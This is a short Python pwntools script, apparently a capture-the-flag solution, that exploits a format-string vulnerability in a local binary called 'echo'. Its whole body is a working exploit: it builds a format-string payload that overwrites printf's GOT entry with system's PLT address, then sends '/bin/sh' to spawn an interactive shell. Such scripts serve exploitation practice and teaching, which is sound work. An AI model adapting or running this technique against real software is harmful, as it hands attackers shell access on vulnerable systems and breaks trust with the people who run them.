#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo")
system_plt = elf.plt["system"]
printf_got = elf.got["printf"]

#  io = process("./echo")
io = process("./echo.patched")

payload = fmtstr_payload(7, {printf_got: system_plt})
io.sendline(payload)

io.sendline("/bin/sh\0")
io.interactive()
io.close()
